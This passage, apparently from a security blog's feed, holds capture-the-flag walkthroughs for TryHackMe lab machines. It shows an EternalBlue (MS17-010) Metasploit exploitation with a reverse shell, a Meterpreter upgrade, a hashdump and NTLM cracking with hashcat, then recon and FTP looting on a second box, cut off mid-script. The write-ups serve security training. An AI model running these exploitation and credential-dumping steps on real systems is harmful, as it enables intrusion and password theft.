&lt;h3 id=&#34;scan-the-machine-if-you-are-unsure-how-to-tackle-this-i-recommend-checking-out-the-nmap-room&#34;&gt;Scan the machine. (If you are unsure how to tackle this, I recommend checking out the Nmap room)&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;❯ nmap --script=vuln -sV -A 10.10.233.113&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Nmap scan report for 10.10.233.113
Host is up (0.43s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
| rdp-vuln-ms12-020: 
|   VULNERABLE:
|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0152
|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
|           
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|   
|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0002
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
|           
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
|_      http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|_ssl-ccs-injection: No reply from server (TIMEOUT)
|_sslv2-drown: 
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 161.25 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;how-many-ports-are-open-with-a-port-number-under-1000&#34;&gt;How many ports are open with a port number under 1000?&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;3&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;what-is-this-machine-vulnerable-to-answer-in-the-form-of-ms--ex-ms08-067&#34;&gt;What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;ms17-010&lt;/code&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;2-gain-access&#34;&gt;2. Gain Access&lt;/h2&gt;
&lt;h3 id=&#34;start-metasploit&#34;&gt;Start metasploit&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;done&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;find-the-exploitation-code-we-will-run-against-the-machine-what-is-the-full-path-of-the-code-ex-exploit&#34;&gt;Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/&amp;hellip;&amp;hellip;..)&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;msf6 &amp;gt; search ms17-010

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 5, use 5 or use exploit/windows/smb/smb_doublepulsar_rce
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;exploit/windows/smb/ms17_010_eternalblue&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;show-options-and-set-the-one-required-value-what-is-the-name-of-this-value-all-caps-for-submission&#34;&gt;Show options and set the one required value. What is the name of this value? (All caps for submission)&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;msf6 &amp;gt; use 2
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;msf6 exploit(windows/smb/ms17_010_eternalblue) &amp;gt; set MY_IP
RHOSTS =&amp;gt; MY_IP
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;RHOSTS&lt;/p&gt;
&lt;h3 id=&#34;usually-it-would-be-fine-to-run-this-exploit-as-is-however-for-the-sake-of-learning-you-should-do-one-more-thing-before-exploiting-the-target-enter-the-following-command-and-press-enter&#34;&gt;Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;set payload windows/x64/shell/reverse_tcp&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;with-that-done-run-the-exploit&#34;&gt;With that done, run the exploit!&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;
msf6 exploit(windows/smb/ms17_010_eternalblue) &amp;gt; exploit

[*] Started reverse TCP handler on 10.2.60.96:4444 
[*] 10.10.233.113:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.233.113:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.233.113:445     - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.233.113:445 - Connecting to target for exploitation.
[+] 10.10.233.113:445 - Connection established for exploitation.
[+] 10.10.233.113:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.233.113:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.233.113:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.233.113:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.233.113:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.233.113:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.233.113:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.233.113:445 - Sending all but last fragment of exploit packet
[*] 10.10.233.113:445 - Starting non-paged pool grooming
[+] 10.10.233.113:445 - Sending SMBv2 buffers
[+] 10.10.233.113:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.233.113:445 - Sending final SMBv2 buffers.
[*] 10.10.233.113:445 - Sending last fragment of exploit packet!
[*] 10.10.233.113:445 - Receiving response from exploit packet
[+] 10.10.233.113:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.233.113:445 - Sending egg to corrupted connection.
[*] 10.10.233.113:445 - Triggering free of corrupted buffer.
[*] Sending stage (336 bytes) to 10.10.233.113
[*] Command shell session 1 opened (10.2.60.96:4444 -&amp;gt; 10.10.233.113:49214) at 2021-02-01 23:22:21 -0500
[+] 10.10.233.113:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.233.113:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.233.113:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;confirm-that-the-exploit-has-run-correctly-you-may-have-to-press-enter-for-the-dos-shell-to-appear-background-this-shell-ctrl--z-if-this-failed-you-may-have-to-reboot-the-target-vm-try-running-it-again-before-a-reboot-of-the-target&#34;&gt;Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;done&lt;/code&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;3-escalate&#34;&gt;3. Escalate&lt;/h2&gt;
&lt;h3 id=&#34;if-you-havent-already-background-the-previously-gained-shell-ctrl--z-research-online-how-to-convert-a-shell-to-meterpreter-shell-in-metasploit-what-is-the-name-of-the-post-module-we-will-use-exact-path-similar-to-the-exploit-we-previously-selected&#34;&gt;If you haven&amp;rsquo;t already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;
msf6 exploit(windows/smb/ms17_010_eternalblue) &amp;gt; search shell_to_meterpreter

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade


Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;post/multi/manage/shell_to_meterpreter&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;select-this-use-module_path-show-options-what-option-are-we-required-to-change-all-caps-for-answer&#34;&gt;Select this (use MODULE_PATH). Show options, what option are we required to change? (All caps for answer)&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;msf6 post(multi/manage/shell_to_meterpreter) &amp;gt; show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on.
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;set-the-required-option-you-may-need-to-list-all-of-the-sessions-to-find-your-target-here&#34;&gt;Set the required option, you may need to list all of the sessions to find your target here.&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;msf6 post(multi/manage/shell_to_meterpreter) &amp;gt; sessions

Active sessions
===============

  Id  Name  Type               Information  Connection
  --  ----  ----               -----------  ----------
  1         shell x64/windows               10.2.60.96:4444 -&amp;gt; 10.10.233.113:49214 (10.10.233.113)

msf6 post(multi/manage/shell_to_meterpreter) &amp;gt; set SESSION 1
SESSION =&amp;gt; 1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;SESSION&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;run-if-this-doesnt-work-try-completing-the-exploit-from-the-previous-task-once-more&#34;&gt;Run! If this doesn&amp;rsquo;t work, try completing the exploit from the previous task once more.&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;msf6 post(multi/manage/shell_to_meterpreter) &amp;gt; exploit

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.2.60.96:4433 
[*] Post module execution completed
msf6 post(multi/manage/shell_to_meterpreter) &amp;gt; 
[*] Sending stage (175174 bytes) to 10.10.233.113
[*] Meterpreter session 2 opened (10.2.60.96:4433 -&amp;gt; 10.10.233.113:49229) at 2021-02-01 23:34:34 -0500
[*] Stopping exploit/multi/handler
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Note: we could also try
&lt;code&gt;sessions -u 1&lt;/code&gt;
&lt;code&gt;-u &amp;lt;opt&amp;gt;  Upgrade a shell to a meterpreter session on many platforms&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;tried though, didnt work&lt;/p&gt;
&lt;h3 id=&#34;once-the-meterpreter-shell-conversion-completes-select-that-session-for-use&#34;&gt;Once the meterpreter shell conversion completes, select that session for use.&lt;/h3&gt;
&lt;p&gt;run: &lt;code&gt;session 2&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;verify-that-we-have-escalated-to-nt-authoritysystem-run-getsystem-to-confirm-this-feel-free-to-open-a-dos-shell-via-the-command-shell-and-run-whoami-this-should-return-that-we-are-indeed-system-background-this-shell-afterwards-and-select-our-meterpreter-session-for-usage-again&#34;&gt;Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command &amp;lsquo;shell&amp;rsquo; and run &amp;lsquo;whoami&amp;rsquo;. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; shell
Process 1400 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32&amp;gt;whoami 
whoami
nt authority\system
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;list-all-of-the-processes-running-via-the-ps-command-just-because-we-are-system-doesnt-mean-our-process-is-find-a-process-towards-the-bottom-of-this-list-that-is-running-at-nt-authoritysystem-and-write-down-the-process-id-far-left-column&#34;&gt;List all of the processes running via the &amp;lsquo;ps&amp;rsquo; command. Just because we are system doesn&amp;rsquo;t mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;done&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;migrate-to-this-process-using-the-migrate-process_id-command-where-the-process-id-is-the-one-you-just-wrote-down-in-the-previous-step-this-may-take-several-attempts-migrating-processes-is-not-very-stable-if-this-fails-you-may-need-to-re-run-the-conversion-process-or-reboot-the-machine-and-start-once-again-if-this-happens-try-a-different-process-next-time&#34;&gt;Migrate to this process using the &amp;lsquo;migrate PROCESS_ID&amp;rsquo; command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;done&lt;/code&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;4-cracking&#34;&gt;4. Cracking&lt;/h2&gt;
&lt;h3 id=&#34;within-our-elevated-meterpreter-shell-run-the-command-hashdump-this-will-dump-all-of-the-passwords-on-the-machine-as-long-as-we-have-the-correct-privileges-to-do-so-what-is-the-name-of-the-non-default-user&#34;&gt;Within our elevated meterpreter shell, run the command &amp;lsquo;hashdump&amp;rsquo;. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;Jon&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;copy-this-password-hash-to-a-file-and-research-how-to-crack-it-what-is-the-cracked-password&#34;&gt;Copy this password hash to a file and research how to crack it. What is the cracked password?&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;❯ hashcat -a 0 -m 1000 crack.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i3-6006U CPU @ 2.00GHz, 2726/2790 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22        
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NTLM
Hash.Target......: ffb43f0de35be4d9917ac0cc8ad57f8d
Time.Started.....: Tue Feb  2 00:08:23 2021 (6 secs)
Time.Estimated...: Tue Feb  2 00:08:29 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1705.7 kH/s (0.39ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10203136/14344385 (71.13%)
Rejected.........: 0/10203136 (0.00%)
Restore.Point....: 10199040/14344385 (71.10%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: alsinah -&amp;gt; alonsouriel

Started: Tue Feb  2 00:07:53 2021
Stopped: Tue Feb  2 00:08:32 2021
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;alqfna22&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;5-find-flags&#34;&gt;5. Find Flags&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; search -f flag*.txt
Found 6 results...
    c:\Documents and Settings\Jon\Documents\flag3.txt (37 bytes)
    c:\Documents and Settings\Jon\My Documents\flag3.txt (37 bytes)
    c:\flag1.txt (24 bytes)
    c:\Users\Jon\Documents\flag3.txt (37 bytes)
    c:\Users\Jon\My Documents\flag3.txt (37 bytes)
    c:\Windows\System32\config\flag2.txt (34 bytes)
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;flag1-this-flag-can-be-found-at-the-system-root&#34;&gt;Flag1? This flag can be found at the system root.&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;1337&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;flag2-this-flag-can-be-found-at-the-location-where-passwords-are-stored-within-windows&#34;&gt;Flag2? This flag can be found at the location where passwords are stored within Windows.&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;1337&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;flag3-this-flag-can-be-found-in-an-excellent-location-to-loot-after-all-administrators-usually-have-pretty-interesting-things-saved&#34;&gt;Flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;1337&lt;/code&gt;&lt;/p&gt;
&lt;hr&gt;
</description>
        </item>
        <item>
        <title>TryHackMe: Break Out The Cage Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-break-out-the-cage-writeup/</link>
        <pubDate>Tue, 15 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-break-out-the-cage-writeup/</guid>
        <description>&lt;img src="https://i.imgur.com/0MxLYQa.png" alt="Featured image of post TryHackMe: Break Out The Cage Writeup" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/breakoutthecage1&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Play&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;1-scanning--enumeration&#34;&gt;1. Scanning &amp;amp; Enumeration&lt;/h2&gt;
&lt;p&gt;We do the below scans in parallel.&lt;/p&gt;
&lt;h3 id=&#34;11-port-scanning&#34;&gt;1.1. Port Scanning&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.8.184
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dd:fd:88:94:f8:c8:d1:1b:51:e3:7d:f8:1d:dd:82:3e (RSA)
|   256 3e:ba:38:63:2b:8d:1c:68:13:d5:05:ba:7a:ae:d9:3b (ECDSA)
|_  256 c0:a6:a3:64:44:1e:cf:47:5f:85:f6:1f:78:4c:59:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Nicholas Cage Stories
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Info gathered:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;FTP running, with anonymous login&lt;/li&gt;
&lt;li&gt;SSH open&lt;/li&gt;
&lt;li&gt;HTTP open, running a website&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;12-web-enumeration&#34;&gt;1.2. Web Enumeration&lt;/h3&gt;
&lt;p&gt;I usually try out both of the below lists, to get a complete idea and not miss out on anything.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/dirb/big.txt -x &#39;php,html,txt&#39; -t 32 -q -u 10.10.100.66              
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/contracts            (Status: 301) [Size: 316] [--&amp;gt; http://10.10.100.66/contracts/]
/html                 (Status: 301) [Size: 311] [--&amp;gt; http://10.10.100.66/html/]     
/images               (Status: 301) [Size: 313] [--&amp;gt; http://10.10.100.66/images/]   
/index.html           (Status: 200) [Size: 2453]                                    
/scripts              (Status: 301) [Size: 314] [--&amp;gt; http://10.10.100.66/scripts/]  
/server-status        (Status: 403) [Size: 277]
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x &#39;php,html,txt&#39; -t 32 -q -u 10.10.100.66 
/images               (Status: 301) [Size: 313] [--&amp;gt; http://10.10.100.66/images/]
/index.html           (Status: 200) [Size: 2453]                                 
/html                 (Status: 301) [Size: 311] [--&amp;gt; http://10.10.100.66/html/]  
/scripts              (Status: 301) [Size: 314] [--&amp;gt; http://10.10.100.66/scripts/]
/contracts            (Status: 301) [Size: 316] [--&amp;gt; http://10.10.100.66/contracts/]
/auditions            (Status: 301) [Size: 316] [--&amp;gt; http://10.10.100.66/auditions/]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Interesting looking things:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;contracts&lt;/li&gt;
&lt;li&gt;auditions&lt;/li&gt;
&lt;li&gt;sripts&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;13-web-exploration&#34;&gt;1.3. Web Exploration&lt;/h3&gt;
&lt;p&gt;Website homepage
&lt;img src=&#34;https://i.imgur.com/7rw5qo1.jpg&#34; alt=&#34;homepage of the website&#34;  /&gt;
All the links are dead.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/contracts/&lt;/code&gt;
&lt;img src=&#34;https://i.imgur.com/wFJbVW8.png&#34; alt=&#34;contracts directory showing a file&#34;  /&gt;
Useless.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/auditions/&lt;/code&gt; an mp3 file found in the auditions directory. We can look into this later if needed.
&lt;img src=&#34;https://i.imgur.com/E29Ojef.png&#34; alt=&#34;an mp3 file is seen in the auditions directory&#34;  /&gt;&lt;/p&gt;
&lt;h3 id=&#34;14-ftp&#34;&gt;1.4. FTP&lt;/h3&gt;
&lt;p&gt;Let&amp;rsquo;s get the interesting looking file from FTP, as anonymous login is allowed.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ ftp 10.10.100.66
Connected to 10.10.100.66.
220 (vsFTPd 3.0.3)
Name (10.10.100.66:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 May 25  2020 .
drwxr-xr-x    2 0        0            4096 May 25  2020 ..
-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
226 Directory send OK.
ftp&amp;gt; get dad_tasks
local: dad_tasks remote: dad_tasks
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for dad_tasks (396 bytes).
226 Transfer complete.
396 bytes received in 0.08 secs (4.8631 kB/s)
ftp&amp;gt; 
221 Goodbye.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We get: &lt;code&gt;UWFwdyBFZWtjbCAtIFB2ciBSTUtQLi4uWFpXIFZXVVIuLi4gVFRJIFhFRi4uLiBMQU{rest_is_yeeted_kekw}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;-base64-&amp;gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Qapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!
Sfw. Kajnmb xsi owuowge
Faz. Tml fkfr qgseik ag oqeibx
Eljwx. Xil bqi aiklbywqe
Rsfv. Zwel vvm imel sumebt lqwdsfk
Yejr. Tqenl Vsw svnt &amp;quot;urqsjetpwbn einyjamu&amp;quot; wf.

Iz glww A ykftef.... {mmm_yum}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;-&lt;a class=&#34;link&#34; href=&#34;https://www.guballa.de/vigenere-solver&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;vingere&lt;/a&gt;-&amp;gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
One. Revamp the website
Two. Put more quotes in script
Three. Buy bee pesticide
Four. Help him with acting lessons
Five. Teach Dad what &amp;quot;information security&amp;quot; is.

In case I forget.... {yee_haww}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now, what could the username be? Look at the questions in the THM room!&lt;/p&gt;
&lt;h2 id=&#34;2-foothold&#34;&gt;2. Foothold&lt;/h2&gt;
&lt;p&gt;Using SSH, we can login.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;weston@national-treasure:~$ id
uid=1001(weston) gid=1001(weston) groups=1001(weston),1000(cage)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Doing some preliminary exploration, we get:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;weston@national-treasure:~$ find / -type f -group cage 2&amp;gt; /dev/null
/opt/.dads_scripts/spread_the_quotes.py
/opt/.dads_scripts/.files/.quotes
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Checking out the first file.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;weston@national-treasure:~$ cat /opt/.dads_scripts/spread_the_quotes.py
#!/usr/bin/env python

#Copyright Weston 2k20 (Dad couldnt write this with all the time in the world!)
import os
import random

lines = open(&amp;quot;/opt/.dads_scripts/.files/.quotes&amp;quot;).read().splitlines()
